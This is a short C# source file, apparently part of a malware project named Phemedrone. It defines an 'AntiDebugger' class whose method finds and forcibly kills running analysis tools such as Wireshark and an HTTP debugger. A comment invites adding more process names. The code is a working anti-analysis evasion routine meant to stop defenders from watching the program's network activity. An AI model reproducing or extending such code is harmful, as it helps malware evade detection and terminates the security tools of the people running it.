using System.Collections.Generic;
using System.Linq;
using System.Diagnostics;

namespace Phemedrone.Protections
{
    public class AntiDebugger
    {
        public static void KillDebuggers()
        {
            // if you are about to add new processes, append lowercase process names
            var debuggers = new List<string>()
            {
                "wireshark", "httpdebbugerui"
            };
            var processList = Process.GetProcesses();
            processList.Where(process => debuggers.Contains(process.ProcessName.ToLower()))
                .ToList()
                .ForEach(process => process.Kill());
        }
    }
}